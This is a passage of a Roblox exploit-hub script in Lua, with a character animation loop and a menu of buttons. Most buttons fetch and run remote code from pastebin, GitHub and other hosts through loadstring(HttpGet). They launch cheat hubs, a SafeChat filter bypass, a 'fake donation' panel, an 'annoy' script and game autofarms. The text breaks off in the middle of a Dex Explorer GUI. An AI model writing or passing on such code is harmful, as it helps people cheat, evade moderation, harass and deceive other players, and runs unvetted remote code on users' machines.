						Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(0,0,-3)).Position,head.CFrame.Position),1)
						neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-40),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-40),math.rad(0),math.rad(00)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					end
					RootPart.CFrame = Target.HumanoidRootPart.CFrame * CFrame.new(0,0,-8)
					for i = 0,100,1 do
						swait()
						game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Target.HumanoidRootPart.Position
						Camera.CFrame = Camera.CFrame:Lerp(CFrame.new((head.CFrame * CFrame.new(-3,0,0)).Position,Target.HumanoidRootPart.CFrame.Position),0.2)
						neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.8,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,0) * CFA(math.rad(20),math.rad(0),math.rad(0)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,-0.5,0) * CFA(math.rad(-80),math.rad(0),math.rad(-20)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,-0.5,0) * CFA(math.rad(-80),math.rad(0),math.rad(20)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(20+ -40)),LerpStyle(0.5,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
						tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,0,0) * CFA(math.rad(0),math.rad(0),math.rad(-20+ -4)),LerpStyle(0.1,Enum.EasingStyle.Back,Enum.EasingDirection.Out))
					end
					Attacking = false
					Camera.CameraType = "Custom"
				end
			end
		end
	end
end)
local RLA = CFrame.new(0,0,0)

local Anim = "Idle"



Humanoid.WalkSpeed = 20
Msgreq("FE Neko Anims V1.6","FE Neko Animations Loaded, have fun - Made by Creo",5,nil)
while true do
	swait()
	hitfloor = rayCast(RootPart.Position, CFrame.new(RootPart.Position, RootPart.Position - Vector3.new(0, 0.5, 0)).lookVector, 4, CloneChar)
	local torvel = (game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Vector3.new(1, 0, 1)).magnitude
	local velderp = RootPart.Velocity.y
	if RootPart.Velocity.y > 0 and hitfloor == nil then
		Anim = "Jumping"

	elseif RootPart.Velocity.y < 0 and hitfloor == nil then
		Anim = "Falling"
	elseif torvel < .5 and hitfloor ~= nil  then
		Anim = "Idle"
	elseif torvel > .5 and  hitfloor ~= nil  then
		Anim = "Walking"
	end
	local W1 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.LookVector
	local W2 = game.Players.LocalPlayer.Character.Humanoid.MoveDirection* RootPart.CFrame.RightVector
	WVA = W1.X+W1.Z
	RLV = W2.X+W2.Z


	if Attacking == false then
		game.Players.LocalPlayer.Character.HumanoidRootPart.Position = tors.Position
		if Anim == "Falling" then
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0.3) * CFA(math.rad(20),0,0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,0,0) * CFA(0,0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(math.rad(-40),0,math.rad(5)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(math.rad(-40),0,math.rad(-5)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4,0.8,0) * CFA(0,0,math.rad(10)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.4,0.5,0)  * CFA(0,0,math.rad(50)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
		elseif Anim == "Jumping" then
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0.3) * CFA(math.rad(-20),0,0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,0,0) * CFA(0,0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0,0,0) * CFA(0,math.rad(-40),math.rad(-20)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0,0,0) * CFA(0,math.rad(40),math.rad(20)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4,0.8,0) * CFA(0,0,math.rad(-10)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0.4,0.5,0)  * CFA(0,0,math.rad(-50)),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
		elseif Anim == "Idle" then
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(7+math.cos(time()*3.83)*-5 + (-6 + math.sin(time()*3.83)*6 )),math.rad(-24) + math.rad( math.sin((time()*3.83)/2)*10),math.rad(-math.cos((time()*3.83)/2)*13)),LerpStyle(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.InOut))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root * CF(0,0,math.cos((time()*3.83))/10) * CFA(math.rad(0),math.rad(0),math.rad(0)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-0.1,math.cos((time()*3.83))/10,0) * CFA(math.rad(-5)- -math.sin((-time()*3.83))/8.7,math.rad(0),math.rad(5)+math.cos((-time()*3.83))/8.7),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(0.1,math.cos((time()*3.83))/10,0) * CFA(math.rad(-5)- -math.sin((-time()*3.83))/8.7,math.rad(0),math.rad(-5)-math.cos((-time()*3.83))/8.7),LerpStyle(0.3*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,-math.cos((time()*3.83))/8,0) * CFA(math.rad(-4),math.rad(-12),math.rad(8)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,-math.cos((time()*3.83))/8,0) * CFA(math.rad(-1),math.rad(7),math.rad(2)),LerpStyle(0.4*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-20 + math.sin(-time()*3.83)*-20),math.rad(-math.sin(time()*3.83/2)*24),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
		elseif Anim == "Walking" and Running == false then
			RLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
			LLA =  CFrame.new((math.sin((time()*8))/1)*0.5 *WVA,0.3*(1-WVA),(math.sin((time()*8))/1)*0.5 *RLV) * CFrame.Angles((-math.sin((time()*8))/1.5)*RLV,0,(math.sin((time()*8))/1.2)*WVA)
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(math.rad(7),math.clamp(math.cos((time()*8))*0.2 + math.rad(-RootPart.RotVelocity.Y*8),math.rad(-85),math.rad(85)),math.rad(-RootPart.RotVelocity.Y*0.4)),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF(0,-math.sin((time()*8*2))/3.2,-math.sin((time()*8*2))/3) * CFA(math.rad( -15 + 10 + WVA*15) + -math.rad(math.sin(time() *(8*2))*10),math.clamp( math.rad(0) - -RootPart.RotVelocity.Y/50,math.rad(-20),math.rad(20)),math.cos((time()*8))*0.2),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(-math.sin((time()*8))/4.5,0,0) * CFA(math.rad(-5),-math.sin((time()*8))*0.1 + math.rad(RootPart.RotVelocity.Y*3),-math.sin((time()*8))*0.4),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-math.sin((time()*8))/4.5,0,0) * CFA(math.rad(-5),-math.sin((time()*8))*0.1 + math.rad(RootPart.RotVelocity.Y*3),-math.sin((time()*8))*0.4),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0,(math.cos((time()*8))/8),0) * RLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,math.rad( -15 + 10 + WVA*15) + -math.rad(math.sin(time() *(8*2))*10)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(0,(-math.cos((time()*8))/8),0) * LLA * CFA(0, (-math.sin((time()*8))*0.5)*WVA,-math.rad( -15 + 10 + WVA*15) + math.rad(math.sin(time() *(8*2))*10)),LerpStyle(0.2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.Angles(math.rad(-30 + math.sin(-time()*8)*-20),0,-math.rad(-math.sin(time()*8/2)*20 + RLV*2)),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
		elseif Anim == "Walking" and Running == true then
			RLA =  CFrame.new(0,(0.5 + math.cos(time()*15)*0.5)*WVA+ 0.2,(0.5 - math.cos(time()*15)*0.5)*RLV+ 0.2) * CFrame.Angles(0,-math.rad(math.sin(time()*15)*80)*RLV,math.rad(math.sin(time()*15)*80)*WVA)
			LLA =  CFrame.new(0,(0.5 + math.cos(time()*15)*0.5)*WVA- 0.2,(-0.5 + math.cos(time()*15)*0.5)*RLV- 0.2) * CFrame.Angles(0,-math.rad(math.sin(time()*15)*80)*RLV,math.rad(-math.sin(time()*15)*80)*WVA)
			RAA = CFrame.new(0,0.8 + math.sin(time()*15)*0.9*WVA,math.sin(time()*15)*0.9*RLV) * CFrame.Angles(0,math.rad(-math.cos(time()*15)*85)*RLV,math.rad(math.cos(time()*15)*85)*WVA)
			LAA = CFrame.new(0,0.8 + math.sin(time()*15)*0.9*WVA,math.sin(time()*15)*0.9*-RLV) * CFrame.Angles(0,math.rad(-math.cos(time()*15)*85)*RLV,math.rad(-math.cos(time()*15)*85)*WVA)
			neck.C1 = neck.C1:Lerp(nek * CF(0,0,0) * CFA(0,math.rad(-RootPart.RotVelocity.Y*5),0),LerpStyle(0.4,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			RootPart.RootJoint.C0 = RootPart.RootJoint.C0:Lerp(root *CF((-1 - math.sin(time()*15)*2)*RLV,(-1 - math.sin(time()*15)*2)*WVA,-1 + 0.5 -math.sin(time()*15)*0.8) * CFA(math.rad(80 - math.cos(time()*15)*20),0,0),LerpStyle(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Shoulder"].C0 = tors["Right Shoulder"].C0:Lerp(rs * CF(0.6+ math.sin(time()*15)*1,0,-0.6)* RAA * CFA(math.rad(-10 - -math.cos(time()*15*2)*10),0,math.rad(80)),LerpStyle(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Left Shoulder"].C0 = tors["Left Shoulder"].C0:Lerp(ls * CF(-0.6+ -math.sin(time()*15)*1,0,-0.6) * LAA * CFA(math.rad(-10 - -math.cos(time()*15*2)*10),0,math.rad(-80)),LerpStyle(0.6,Enum.EasingStyle.Back,Enum.EasingDirection.InOut))
			tors["Right Hip"].C0 = tors["Right Hip"].C0:Lerp(rh * CF(0.4 + -math.cos(time()*15)*0.9,0,0) * RLA * CFA(0, 0,math.rad(50)),LerpStyle(0.6,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			tors["Left Hip"].C0 = tors["Left Hip"].C0:Lerp(lh * CF(-0.4+ math.cos(time()*15)*0.9,0,0) * LLA * CFA(0, 0,math.rad(-80)),LerpStyle(0.6,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
			TailWeld.C0 = TailWeld.C0:Lerp(TC0 * CFrame.new(0,0.7,0.3) * CFrame.Angles(math.rad(-110 + math.sin(-time()*15)*-20),-math.rad(RLV*30),0),LerpStyle(0.1*1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut))
		end
	end
end
end)
Tab3Section:NewButton("Chat Translator", "Translates Chats", function(sc)
loadstring(game:HttpGetAsync('https://i.qts.life/r/ChatInlineTranslator.lua', true))()
--[[
af = "Afrikaans",
    sq = "Albanian",
    am = "Amharic",
    ar = "Arabic",
    hy = "Armenian",
    az = "Azerbaijani",
    eu = "Basque",
    be = "Belarusian",
    bn = "Bengali",
    bs = "Bosnian",
    bg = "Bulgarian",
    ca = "Catalan",
    ceb = "Cebuano",
    ny = "Chichewa",
    ['zh-cn'] = "Chinese Simplified",
    ['zh-tw'] = "Chinese Traditional",
    co = "Corsican",
    hr = "Croatian",
    cs = "Czech",
    da = "Danish",
    nl = "Dutch",
    en = "English",
    eo = "Esperanto",
    et = "Estonian",
    tl = "Filipino",
    fi = "Finnish",
    fr = "French",
    fy = "Frisian",
    gl = "Galician",
    ka = "Georgian",
    de = "German",
    el = "Greek",
    gu = "Gujarati",
    ht = "Haitian Creole",
    ha = "Hausa",
    haw = "Hawaiian",
    iw = "Hebrew",
    hi = "Hindi",
    hmn = "Hmong",
    hu = "Hungarian",
    is = "Icelandic",
    ig = "Igbo",
    id = "Indonesian",
    ga = "Irish",
    it = "Italian",
    ja = "Japanese",
    jw = "Javanese",
    kn = "Kannada",
    kk = "Kazakh",
    km = "Khmer",
    ko = "Korean",
    ku = "Kurdish (Kurmanji)",
    ky = "Kyrgyz",
    lo = "Lao",
    la = "Latin",
    lv = "Latvian",
    lt = "Lithuanian",
    lb = "Luxembourgish",
    mk = "Macedonian",
    mg = "Malagasy",
    ms = "Malay",
    ml = "Malayalam",
    mt = "Maltese",
    mi = "Maori",
    mr = "Marathi",
    mn = "Mongolian",
    my = "Myanmar (Burmese)",
    ne = "Nepali",
    no = "Norwegian",
    ps = "Pashto",
    fa = "Persian",
    pl = "Polish",
    pt = "Portuguese",
    pa = "Punjabi",
    ro = "Romanian",
    ru = "Russian",
    sm = "Samoan",
    gd = "Scots Gaelic",
    sr = "Serbian",
    st = "Sesotho",
    sn = "Shona",
    sd = "Sindhi",
    si = "Sinhala",
    sk = "Slovak",
    sl = "Slovenian",
    so = "Somali",
    es = "Spanish",
    su = "Sundanese",
    sw = "Swahili",
    sv = "Swedish",
    tg = "Tajik",
    ta = "Tamil",
    te = "Telugu",
    th = "Thai",
    tr = "Turkish",
    uk = "Ukrainian",
    ur = "Urdu",
    uz = "Uzbek",
    vi = "Vietnamese",
    cy = "Welsh",
    xh = "Xhosa",
    yi = "Yiddish",
    yo = "Yoruba",
    zu = "Zulu"
--]]
end)
Tab3Section:NewButton("Infinite Yield", "Opens the popular Infinite Yield", function(IY)
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
Tab3Section:NewButton("Chat Bypasser", "Bypasses the SafeChat", function(CB)
loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)
Tab3Section:NewButton("Pls Donate Fake Donation Panel", "Opens a GUI and makes Fake Donations", function(PDS)
loadstring(game:HttpGet(("https://raw.githubusercontent.com/o5u3/PLS-Donate/main/Fake-Donate.lua")))()
end)
Tab3Section:NewButton("MM2 Script", "Opens a AutoFarm MM2 GUI", function (MM2G)
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))();
end)
Tab1Section:NewTextBox("Slap Battles Glove Changer", "Allows you to select what glove do you want", function(idk)
game.Players.fwahfaoghoia.leaderstats.Glove.Value = idk
end)
Tab3Section:NewButton("Dizzy Hub", "A slap battles script hub", function(idk)
loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)
Tab3Section:NewButton("Annoy Script", "Allows you to annoy people.", function(epic)
loadstring(game:HttpGet("https://pastebin.com/raw/1cHdCvTF"))()
end)
Tab3Section:NewButton("Sape V4", "opens sape", function(sape)
loadstring(game:HttpGet("https://raw.githubusercontent.com/vodxn/sape/main/Initiate.lua"))()
end)
Tab3Section:NewButton("Broken Bones IV Script", "Opens a script for Broken Bones IV.", function(BBIV)
local GUI = Instance.new("ScreenGui")
local OpenFrame = Instance.new("Frame")
local Open = Instance.new("TextButton")
local Main = Instance.new("Frame")
local TextOben = Instance.new("TextLabel")
local TextUnten = Instance.new("TextLabel")
local Start = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local Close = Instance.new("TextButton")
--Properties:
GUI.Name = "GUI"
GUI.Parent = game.CoreGui

OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = GUI
OpenFrame.Active = true
OpenFrame.BackgroundColor3 = Color3.new(0.247059, 0.247059, 0.247059)
OpenFrame.Position = UDim2.new(0, 0, 0.539840639, 0)
OpenFrame.Size = UDim2.new(0, 114, 0, 30)

Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0.247059, 0.247059, 0.247059)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.0370370373, 0, 0.13333334, 0)
Open.Size = UDim2.new(0, 104, 0, 22)
Open.Font = Enum.Font.SciFi
Open.Text = "Open"
Open.TextColor3 = Color3.new(0, 0, 0)
Open.TextSize = 20
Open.MouseButton1Down:connect(function()
Main.Visible = true
OpenFrame.Visible = false
end)

Main.Name = "Main"
Main.Parent = GUI
Main.Active = true
Main.BackgroundColor3 = Color3.new(0.203922, 0.203922, 0.203922)
Main.BackgroundTransparency = 0.20000000298023
Main.BorderColor3 = Color3.new(0, 0, 0)
Main.Position = UDim2.new(0.393034846, 0, 0.288844645, 0)
Main.Size = UDim2.new(0, 172, 0, 211)
Main.Draggable = true

TextOben.Name = "TextOben"
TextOben.Parent = Main
TextOben.BackgroundColor3 = Color3.new(0, 0.333333, 1)
TextOben.BorderColor3 = Color3.new(0, 0, 0)
TextOben.Position = UDim2.new(-0.116279073, 0, -0.0900473967, 0)
TextOben.Size = UDim2.new(0, 212, 0, 31)
TextOben.Font = Enum.Font.SciFi
TextOben.Text = "Broken Cash"
TextOben.TextColor3 = Color3.new(0, 0, 0)
TextOben.TextSize = 30

TextUnten.Name = "TextUnten"
TextUnten.Parent = Main
TextUnten.BackgroundColor3 = Color3.new(0, 0.333333, 1)
TextUnten.Position = UDim2.new(-0.116279073, 0, 0.928909957, 0)
TextUnten.Size = UDim2.new(0, 212, 0, 31)
TextUnten.Font = Enum.Font.SciFi
TextUnten.Text = "Credits Ziegel#8171"
TextUnten.TextColor3 = Color3.new(0, 0, 0)
TextUnten.TextSize = 24

Start.Name = "Start"
Start.Parent = Main
Start.BackgroundColor3 = Color3.new(1, 1, 1)
Start.BackgroundTransparency = 1
Start.BorderSizePixel = 0
Start.Position = UDim2.new(0.0755813941, 0, 0.113744073, 0)
Start.Size = UDim2.new(0, 146, 0, 54)
Start.Font = Enum.Font.Cartoon
Start.Text = "Start"
Start.TextColor3 = Color3.new(0, 0, 0)
Start.TextSize = 40
Start.MouseButton1Down:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2207, 128, -374)
end)
Start.MouseButton1Down:connect(function()
plr = game:GetService('Players').LocalPlayer
torso = plr.Character.UpperTorso
hum = plr.Character.Humanoid
mouse = plr:GetMouse()
stop = false
while stop == false do
local bp = Instance.new('BodyPosition')
bp.MaxForce = Vector3.new(999999,999999,999999)
bp.Position = torso.Position
bp.Parent = torso
local bav = Instance.new('BodyAngularVelocity')
bav.MaxTorque = Vector3.new(999999,999999,999999)
bav.AngularVelocity = Vector3.new(200,200,200)
bav.Parent = torso
wait()
end
end)

Stop.Name = "Stop"
Stop.Parent = Main
Stop.BackgroundColor3 = Color3.new(1, 1, 1)
Stop.BackgroundTransparency = 1
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0755813941, 0, 0.369668275, 0)
Stop.Size = UDim2.new(0, 146, 0, 54)
Stop.Font = Enum.Font.Cartoon
Stop.Text = "Stop"
Stop.TextColor3 = Color3.new(0, 0, 0)
Stop.TextSize = 40
Stop.MouseButton1Down:connect(function()
local player = game.Players.LocalPlayer.Name

game.workspace[player]:BreakJoints()
end)

Close.Name = "Close"
Close.Parent = Main
Close.BackgroundColor3 = Color3.new(1, 1, 1)
Close.BackgroundTransparency = 1
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.0755813941, 0, 0.654028475, 0)
Close.Size = UDim2.new(0, 145, 0, 45)
Close.Font = Enum.Font.SciFi
Close.Text = "Close"
Close.TextColor3 = Color3.new(0, 0, 0)
Close.TextSize = 25
Close.MouseButton1Down:connect(function()
OpenFrame.Visible = true
Main.Visible = false
end)
end)
Tab3Section:NewButton("Brookhaven Script", "Opens IceHub", function(BH)
loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/60832e7d04766a6381194d7502fbb1e8/raw/fbecd900a62e1fa054998f02084475b6c4ed8f18/woah", true))()
end)
Tab3Section:NewButton("Doomspire BrickBattle Script", "Opens a DBB Script", function(DBB)
loadstring(game:HttpGet('https://raw.githubusercontent.com/Rollimonster/Roblox-Doomspire-Gui/main/Roblox-Doomspire-Gui'))()
end)
Tab3Section:NewButton("Dex Explorer", "Opens the popular Dex Explorer", function(DEEX)
CreateGui = function()
local NewGuiPart1 = Instance.new("ScreenGui")
local NewGuiPart2 = Instance.new("Frame")
local NewGuiPart3 = Instance.new("Frame")
local NewGuiPart4 = Instance.new("TextLabel")
local NewGuiPart5 = Instance.new("TextBox")
local NewGuiPart6 = Instance.new("Frame")
local NewGuiPart7 = Instance.new("Frame")
local NewGuiPart8 = Instance.new("TextButton")
local NewGuiPart9 = Instance.new("TextLabel")
local NewGuiPart10 = Instance.new("TextLabel")
local NewGuiPart11 = Instance.new("ImageLabel")
local NewGuiPart12 = Instance.new("Frame")
local NewGuiPart13 = Instance.new("Frame")
local NewGuiPart14 = Instance.new("Frame")
local NewGuiPart15 = Instance.new("TextButton")
local NewGuiPart16 = Instance.new("ImageLabel")
local NewGuiPart17 = Instance.new("TextButton")
local NewGuiPart18 = Instance.new("ImageLabel")
local NewGuiPart19 = Instance.new("TextButton")
local NewGuiPart20 = Instance.new("ImageLabel")
local NewGuiPart21 = Instance.new("TextButton")
local NewGuiPart22 = Instance.new("ImageLabel")
local NewGuiPart23 = Instance.new("TextButton")
local NewGuiPart24 = Instance.new("ImageLabel")
local NewGuiPart25 = Instance.new("TextButton")
local NewGuiPart26 = Instance.new("ImageLabel")
local NewGuiPart27 = Instance.new("TextButton")
local NewGuiPart28 = Instance.new("Frame")
local NewGuiPart29 = Instance.new("Frame")
local NewGuiPart30 = Instance.new("TextLabel")
local NewGuiPart31 = Instance.new("Frame")
local NewGuiPart32 = Instance.new("TextLabel")
local NewGuiPart33 = Instance.new("TextLabel")
local NewGuiPart34 = Instance.new("TextButton")
local NewGuiPart35 = Instance.new("TextLabel")
local NewGuiPart36 = Instance.new("TextLabel")
local NewGuiPart37 = Instance.new("Frame")
local NewGuiPart38 = Instance.new("Frame")
local NewGuiPart39 = Instance.new("TextLabel")
local NewGuiPart40 = Instance.new("Frame")
local NewGuiPart41 = Instance.new("TextButton")
local NewGuiPart42 = Instance.new("TextLabel")
local NewGuiPart43 = Instance.new("TextButton")
local NewGuiPart44 = Instance.new("TextBox")
local NewGuiPart45 = Instance.new("TextButton")
local NewGuiPart46 = Instance.new("TextLabel")
local NewGuiPart47 = Instance.new("TextLabel")
local NewGuiPart48 = Instance.new("Frame")
local NewGuiPart49 = Instance.new("TextLabel")
local NewGuiPart50 = Instance.new("Frame")
local NewGuiPart51 = Instance.new("TextButton")
local NewGuiPart52 = Instance.new("TextLabel")
local NewGuiPart53 = Instance.new("TextButton")
local NewGuiPart54 = Instance.new("Frame")
local NewGuiPart55 = Instance.new("TextLabel")
local NewGuiPart56 = Instance.new("Frame")
local NewGuiPart57 = Instance.new("TextLabel")
local NewGuiPart58 = Instance.new("TextButton")
local NewGuiPart59 = Instance.new("Frame")
local NewGuiPart60 = Instance.new("TextLabel")
local NewGuiPart61 = Instance.new("Frame")
local NewGuiPart62 = Instance.new("TextLabel")
local NewGuiPart63 = Instance.new("ScrollingFrame")
local NewGuiPart64 = Instance.new("TextButton")
local NewGuiPart65 = Instance.new("TextLabel")
local NewGuiPart66 = Instance.new("TextLabel")
local NewGuiPart67 = Instance.new("TextButton")
local NewGuiPart68 = Instance.new("TextButton")
local NewGuiPart69 = Instance.new("Frame")
local NewGuiPart70 = Instance.new("TextButton")
local NewGuiPart71 = Instance.new("TextBox")
local NewGuiPart72 = Instance.new("TextButton")
local NewGuiPart73 = Instance.new("TextButton")
local NewGuiPart74 = Instance.new("Frame")
local NewGuiPart75 = Instance.new("Frame")
local NewGuiPart76 = Instance.new("TextButton")
local NewGuiPart77 = Instance.new("ScrollingFrame")
local NewGuiPart78 = Instance.new("Frame")
local NewGuiPart79 = Instance.new("TextLabel")
local NewGuiPart80 = Instance.new("TextLabel")
local NewGuiPart81 = Instance.new("TextLabel")
local NewGuiPart82 = Instance.new("Frame")
local NewGuiPart83 = Instance.new("TextLabel")
local NewGuiPart84 = Instance.new("Frame")
local NewGuiPart85 = Instance.new("Frame")
local NewGuiPart86 = Instance.new("Frame")
local NewGuiPart87 = Instance.new("ImageButton")
local NewGuiPart88 = Instance.new("Frame")
local NewGuiPart89 = Instance.new("Frame")
local NewGuiPart90 = Instance.new("Frame")
local NewGuiPart91 = Instance.new("Frame")
local NewGuiPart92 = Instance.new("Frame")
local NewGuiPart93 = Instance.new("ImageButton")
local NewGuiPart94 = Instance.new("Frame")
local NewGuiPart95 = Instance.new("Frame")
local NewGuiPart96 = Instance.new("Frame")
local NewGuiPart97 = Instance.new("Frame")
local NewGuiPart98 = Instance.new("Frame")
local NewGuiPart99 = Instance.new("TextButton")
local NewGuiPart100 = Instance.new("Frame")
local NewGuiPart101 = Instance.new("Frame")
local NewGuiPart102 = Instance.new("TextButton")
local NewGuiPart103 = Instance.new("TextButton")
local NewGuiPart104 = Instance.new("TextButton")
local NewGuiPart105 = Instance.new("Frame")
local NewGuiPart106 = Instance.new("Frame")
local NewGuiPart107 = Instance.new("TextLabel")
local NewGuiPart108 = Instance.new("TextLabel")
local NewGuiPart109 = Instance.new("TextLabel")
local NewGuiPart110 = Instance.new("ImageLabel")
local NewGuiPart111 = Instance.new("Frame")
local NewGuiPart112 = Instance.new("Frame")
local NewGuiPart113 = Instance.new("TextLabel")
local NewGuiPart114 = Instance.new("Frame")
local NewGuiPart115 = Instance.new("Frame")
local NewGuiPart116 = Instance.new("TextLabel")
